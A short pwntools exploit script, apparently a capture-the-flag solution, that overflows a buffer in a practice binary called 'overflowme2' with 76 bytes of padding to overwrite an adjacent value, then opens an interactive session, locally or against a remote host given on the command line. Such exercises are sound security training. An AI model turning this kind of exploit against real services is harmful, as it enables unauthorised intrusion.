from pwn import *

def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([exe] + argv, *a, **kwargs)


gdbscript='''
break *main+78
continue
'''

exe='./overflowme2'

context.log_level='debug'

elf=context.binary=ELF(exe, checksec=True)

padding=76

admin='\x59\x59\x59\x59'

payload = flat({padding:admin})

nc = start()

nc.sendlineafter(b'Please go ahead and leave a comment :', payload)

nc.interactive()
